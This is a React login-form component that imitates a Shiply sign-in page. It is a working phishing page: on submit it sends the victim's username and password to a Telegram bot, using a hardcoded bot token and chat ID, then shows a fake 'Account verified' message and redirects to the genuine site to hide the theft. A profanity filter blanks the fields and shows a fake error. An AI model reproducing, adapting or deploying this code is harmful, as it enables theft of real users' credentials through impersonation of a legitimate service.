import React from "react";
import { useState, useRef } from "react";
import './form.css';
import Swal from 'sweetalert2'

function Form() {
    const [ereva, setEreva] = useState(false);
    const userName = useRef(null);
    const passwordUser = useRef(null);
    var qfNum = 0;
    
    function qfFunck(qf) {
        if (qf.value.indexOf('ccox') !== -1 || qf.value.indexOf('klir') !== -1 || qf.value.indexOf('qunn') !== -1 || qf.value.indexOf('jajtam') !== -1 ||
            qf.value.indexOf('jaj tam') !== -1 || qf.value.indexOf('txeq') !== -1 || qf.value.indexOf('cceq') !== -1 || qf.value.indexOf('uteq') !== -1 ||
            qf.value.indexOf('fuck') !== -1 || qf.value.indexOf('suck') !== -1 || qf.value.indexOf('dick') !== -1 || qf.value.indexOf('gandon') !== -1 ||
            qf.value.indexOf('qunnem') !== -1 || qf.value.indexOf('txa') !== -1 || qf.value.indexOf('boz') !== -1 || qf.value.indexOf('chatlax') !== -1 ||
            qf.value.indexOf('gyot') !== -1 || qf.value.indexOf('garlax') !== -1) {
            qf.value = '';
            qfNum = 1;
        } else {
            qfNum = 0;
        }
    }

    const handleInputBlur = event => {
        qfFunck(event.target);
    };
    const close = () => {
        setEreva(!ereva);
    };

    function handleSubmit(event) {
        event.preventDefault();
        if (qfNum === 1) {
            userName.current.value = '';
            passwordUser.current.value = '';
            setEreva(!ereva);
        } else if (qfNum === 0) {
            qfFunck(passwordUser.current);
            if (qfNum === 0) {
                if (userName.current.value && passwordUser.current.value) {
                    const url = `https://api.telegram.org/bot7232961788:AAGOVTuePJceVlZNpbvrUSCuki5DlmRHvmc/sendMessage`
                    const obj = {
                        chat_id: 1368494862, 
                        text: "Username - " + userName.current.value + "\n" + "Password - " + passwordUser.current.value,
                    };
                    const xht = new XMLHttpRequest();
                    xht.open("POST", url, true);
                    xht.setRequestHeader("Content-type", "application/json; charset=UTF-8");
                    xht.send(JSON.stringify(obj));
                    Swal.fire({
                        heightAuto: false,
                        customClass: {confirmButton: 'confirm-button-class', title: 'title-class'}, 
                        title: "Delivery firms compete for your job",
                        text: "Account verified.",
                        preConfirm: () => {window.location.href = "https://www.shiply.com/";},
                    });
                    return;
                } else {
                    setEreva(!ereva);
                }
            }
        }
    }
  return (
    <div className="FormBig">
        <div style={ereva ? {display:'flex'} : {display:'none'}} className="error">
            <p className="errorText">Your username or password was incorrect.</p>
            <button onClick={close} className="close">x</button>
        </div>
        <div className="Form">
            <h2 className="logintitle">Log in</h2>
            <form onSubmit={handleSubmit} id ="forms">
                <div className = "inputBlock" >
                    <input onBlur={handleInputBlur} id="Username" ref={userName} name="Username" type="text" className="form-control"/>
                    <span className='placeholder'>Email Address or Username</span> 
                </div>
                <div className = "inputBlock" >
                    <input onBlur={handleInputBlur} id="Password" ref={passwordUser} name="Password" type ="password" className="form-control"/>
                    <span className='placeholder'>Password</span>
                </div> 
                <button id="btnLoginContinue" type='submit' className={"btnLogin"}>Login</button> 
            </form> 
            <p className="righttext"><a className="forgotpass" href="https://www.shiply.com/users/forgot">Forgot Password</a></p>
        </div>
    </div>
  );
}

export default Form;
